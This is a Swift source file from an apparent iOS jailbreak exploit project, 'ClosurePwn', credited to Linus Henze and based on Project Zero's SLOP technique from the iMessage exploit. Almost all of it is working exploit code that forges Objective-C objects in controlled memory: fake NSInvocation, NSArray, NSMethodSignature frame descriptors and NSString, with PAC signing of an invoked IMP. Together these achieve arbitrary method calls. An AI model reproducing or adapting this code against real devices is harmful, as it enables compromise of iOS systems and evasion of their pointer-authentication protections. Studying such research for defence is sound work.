//
//  FakeObjects.swift
//  ClosurePwn
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//
//  Based on slop.py from the iOS 12.4 iMessage exploit by Samuel Groß
//  See https://bugs.chromium.org/p/project-zero/issues/detail?id=1917#c6
//  Description of SLOP: https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html
//

import Foundation
import JailbreakUtils

open class FakeInvocation: PoolEncodeable {
    public var argumentStorage: ResolvedSymbolTarget
    public var returnStorage:   ResolvedSymbolTarget
    public let signature: FakeMethodSignature
    public let useRealNSInvocation: Bool
    
    public var realNSInvArgStorage: [ResolvedSymbolTarget]?
    
    private static var _sharedReturnStorage: [(ClosureMemoryPool, ResolvedSymbolTarget)] = []
    
    public init(pool: ClosureMemoryPool, argCount: UInt32, argumentsLoc: ResolvedSymbolTarget, returnStorage: ResolvedSymbolTarget? = nil, realNSInvocation: Bool = false) throws {
        argumentStorage = argumentsLoc
        
        self.returnStorage = try returnStorage ?? Self.getSharedReturnStorage(pool: pool)
        
        self.signature = FakeMethodSignature(argCount: argCount)
        
        useRealNSInvocation = realNSInvocation
    }
    
    public convenience init(pool: ClosureMemoryPool, arguments: [ResolvedSymbolTarget], returnStorage: ResolvedSymbolTarget? = nil, realNSInvocation: Bool = false) throws {
        // Allocate arguments
        let storage = try Self.getArgumentStorage(pool: pool, arguments: arguments)
        
        try self.init(pool: pool, argCount: UInt32(arguments.count), argumentsLoc: storage.reference, returnStorage: returnStorage, realNSInvocation: realNSInvocation)
    }
    
    public static func getSharedReturnStorage(pool: ClosureMemoryPool) throws -> ResolvedSymbolTarget {
        for e in _sharedReturnStorage {
            if e.0 === pool {
                return e.1
            }
        }
        
        let shared = try pool.append(object: Data(repeating: 0, count: 0xe0)).reference
        _sharedReturnStorage.append((pool, shared))
        
        return shared
    }
    
    public static func getArgumentStorage(pool: ClosureMemoryPool, arguments: [ResolvedSymbolTarget]) throws -> ClosureMemoryObject {
        var descs: [ClosureMemoryDescriptor] = []
        
        var shouldSignIMP = false
        for i in 0..<arguments.count {
            if i == 1 {
                if let iUi = try? SharedCache.running.offsetOfSelector("invokeUsingIMP:") {
                    if arguments[i] == iUi {
                        shouldSignIMP = true
                    }
                }
            }
            
            if i == 2 && shouldSignIMP {
                descs.append(.init(offset: UInt64(i) * 8, target: arguments[i], pacKey: .IA(context: 0, derived: false)))
            } else {
                descs.append(.init(offset: UInt64(i) * 8, target: arguments[i]))
            }
        }
        
        return try pool.makeMemoryObject(size: UInt64(arguments.count) * 8, data: descs)
    }
    
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        let sig = try memoryPool.append(object: signature)
        
        let cls = useRealNSInvocation ? "NSInvocation" : "NSBlockInvocation"
        
        let res = try memoryPool.makeMemoryObject(size: 9 * 8, data: [
            try .class(offset: 0, className: cls),
            .init(offset: 8, target: argumentStorage),
            .init(offset: 16, target: returnStorage),
            .init(offset: 24, target: sig.reference),
            .init(offset: 32, target: .absolute(address: 0)), // Container
            .init(offset: 40, target: .absolute(address: 0)), // replaced...
            .init(offset: 48, target: .absolute(address: 0)), // signedTarget
            .init(offset: 56, target: .absolute(address: 0)), // signedSelector
            .init(offset: 64, target: .absolute(address: 0))  // magic
        ])
        
        return res
    }
    
    public func referenceToArgument(_ num: UInt32) -> ResolvedSymbolTarget {
        if useRealNSInvocation && num < 2 {
            return realNSInvArgStorage![Int(num)]
        }
        
        if case .image(number: let imNum, offset: let off) = argumentStorage {
            return .image(number: imNum, offset: off + (UInt64(num) * 8))
        }
        
        fatalError("Something is wrong with your memory pool!")
    }
}

open class FakeArray: PoolEncodeable {
    public var content: [ResolvedSymbolTarget] = []
    
    public init() {}
    
    public init(withContent: [ResolvedSymbolTarget]) {
        content = withContent
    }
    
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        var descs: [ClosureMemoryDescriptor] = []
        descs.append(try .class(offset: 0, className: "__NSArrayI"))
        descs.append(.init(offset: 8, target: .absolute(address: UInt64(content.count))))
        
        for i in 0..<content.count {
            descs.append(.init(offset: UInt64(i + 2) * 8, target: content[i]))
        }
        
        return try memoryPool.makeMemoryObject(size: 16 + (UInt64(content.count) * 8), data: descs)
    }
}

open class FakeMethodSignature: PoolEncodeable {
    public struct FrameDescriptor: PoolEncodeable {
        public static var _cachedDescriptorLists: [(ClosureMemoryPool, [UInt32: ClosureMemoryObject])] = []
        public static var _cachedDescriptors: [(ClosureMemoryPool, [UInt32: ClosureMemoryObject])] = []
        
        public var argCount: UInt32 = 0
        
        public static func getCachedDescriptorLists(memoryPool: ClosureMemoryPool) -> [UInt32: ClosureMemoryObject] {
            for e in _cachedDescriptorLists {
                if e.0 === memoryPool {
                    return e.1
                }
            }
            
            let res: [UInt32: ClosureMemoryObject] = [:]
            _cachedDescriptorLists.append((memoryPool, res))
            
            return res
        }
        
        public static func setCachedDescriptorLists(memoryPool: ClosureMemoryPool, new: [UInt32: ClosureMemoryObject]) {
            for i in 0..<_cachedDescriptorLists.count {
                if _cachedDescriptorLists[i].0 === memoryPool {
                    _cachedDescriptorLists[i].1 = new
                    return
                }
            }
            
            fatalError("setCachedDescriptorLists: Pool not found! [This should not happen]")
        }
        
        public static func getCachedDescriptors(memoryPool: ClosureMemoryPool) -> [UInt32: ClosureMemoryObject] {
            for e in _cachedDescriptors {
                if e.0 === memoryPool {
                    return e.1
                }
            }
            
            let res: [UInt32: ClosureMemoryObject] = [:]
            _cachedDescriptors.append((memoryPool, res))
            
            return res
        }
        
        public static func setCachedDescriptors(memoryPool: ClosureMemoryPool, new: [UInt32: ClosureMemoryObject]) {
            for i in 0..<_cachedDescriptors.count {
                if _cachedDescriptors[i].0 === memoryPool {
                    _cachedDescriptors[i].1 = new
                    return
                }
            }
            
            fatalError("setCachedDescriptors: Pool not found! [This should not happen]")
        }
        
        public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
            var cachedDescriptors = Self.getCachedDescriptors(memoryPool: memoryPool)
            if cachedDescriptors.keys.contains(argCount) {
                return cachedDescriptors[argCount].unsafelyUnwrapped
            }
            
            // Also return something with slightly more arguments if possible
            if cachedDescriptors.keys.contains(argCount+1) {
                return cachedDescriptors[argCount+1].unsafelyUnwrapped
            }
            
            if cachedDescriptors.keys.contains(argCount+2) {
                return cachedDescriptors[argCount+2].unsafelyUnwrapped
            }
            
            if cachedDescriptors.keys.contains(argCount+3) {
                return cachedDescriptors[argCount+3].unsafelyUnwrapped
            }
            
            let resultType = try make_frame_descriptor_list(argCount: 1, pool: memoryPool)
            
            let argTypes = try make_frame_descriptor_list(argCount: argCount, pool: memoryPool)
            
            let res = try memoryPool.makeMemoryObject(size: 8 * 3, data: [
                .init(offset: 0, target: resultType.reference), // Result type
                .init(offset: 8, target: argTypes.reference),   // Argument type
                .init(offset: 16, target: .absolute(address: 0xe000000000 + UInt64(argCount))), // Argument count + frame size
            ])
            
            cachedDescriptors[argCount] = res
            Self.setCachedDescriptors(memoryPool: memoryPool, new: cachedDescriptors)
            
            return res
        }
        
        private func make_frame_descriptor_list(argCount: UInt32, pool: ClosureMemoryPool) throws -> ClosureMemoryObject {
            var cachedDescriptorLists = Self.getCachedDescriptorLists(memoryPool: pool)
            if cachedDescriptorLists.keys.contains(argCount) {
                return cachedDescriptorLists[argCount]!
            }
            
            var last: ClosureMemoryObject? = nil
            
            let range = 0..<UInt64(argCount)
            for i in range.reversed() {
                let res = try pool.makeMemoryObject(size: 40, data: [
                    .init(offset: 0, target: .absolute(address: 0)),     // ???
                    .init(offset: 8, target: last?.reference ?? .absolute(address: 0)), // Pointer to next
                    .init(offset: 16, target: .absolute(address: 8)), // Memory offset and size
                    .init(offset: 24, target: .absolute(address: (i*8) << 32 | 0x8)), // Memory offset and size
                    .init(offset: 32, target: .absolute(address: 0x515100000000)), // Flags
                ])
                
                last = res
            }
            
            guard last != nil else {
                throw MemoryPoolError.invalidArgument(arg: self, description: "Cannot encode frame descriptor without arguments!")
            }
            
            cachedDescriptorLists[argCount] = last.unsafelyUnwrapped
            Self.setCachedDescriptorLists(memoryPool: pool, new: cachedDescriptorLists)
            
            return last.unsafelyUnwrapped
        }
    }
    
    private var _frame: FrameDescriptor = FrameDescriptor()
    public var frame: FrameDescriptor {
        get {
            _frame
        }
        
        set {
            if frozen {
                fatalError("Attempted to modify a frozen MethodSignature")
            }
            
            _frame = newValue
        }
    }
    
    public private(set) var frozen = false
    
    public init() {}
    
    public init(argCount: UInt32) {
        frame.argCount = argCount
    }
    
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        let fr = try frame.toMemoryObject(memoryPool: memoryPool)
        
        let res = try memoryPool.makeMemoryObject(size: 24, data: [
            try .class(offset: 0, className: "NSMethodSignature"),
            .init(offset: 8, target: fr.reference),
            .init(offset: 16, target: .absolute(address: 0))
        ])
        
        frozen = true
        
        return res
    }
}

public struct FakeEmptyObject: PoolEncodeable {
    public let allocSize: UInt64
    public var className: String
    
    public init(allocSize: UInt64, className: String) {
        self.allocSize = allocSize
        self.className = className
    }
    
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        let res = try memoryPool.makeMemoryObject(size: 8 + allocSize, data: [
            try .class(offset: 0, className: className)
        ])
        
        return res
    }
}

public struct FakeNSString: PoolEncodeable {
    public var content: String
    
    public init(_ str: String) {
        content = str
    }
    
    public func toMemoryObject(memoryPool: ClosureMemoryPool) throws -> ClosureMemoryObject {
        var dat = content.data(using: .utf8)!
        var size = UInt64(dat.count)
        
        if size < 0x100 {
            dat = Data(fromObject: UInt8(size)) + dat
            size += 1
        } else {
            dat = Data(fromObject: UInt64(size)) + dat
            size += 8
        }
        
        var array: [ClosureMemoryDescriptor] = [
            try .class(offset: 0, className: "__NSCFString")
        ]
        
        if size < 0x100 {
            array.append(.init(offset: 8, target: .absolute(address: 0x000000010000078c)))
        } else {
            array.append(.init(offset: 8, target: .absolute(address: 0x0000000100000788)))
        }
        
        array = dat.appendToMemoryDescriptors(offset: 16, array: array)
        
        return try memoryPool.makeMemoryObject(size: 16 + size, data: array)
    }
}
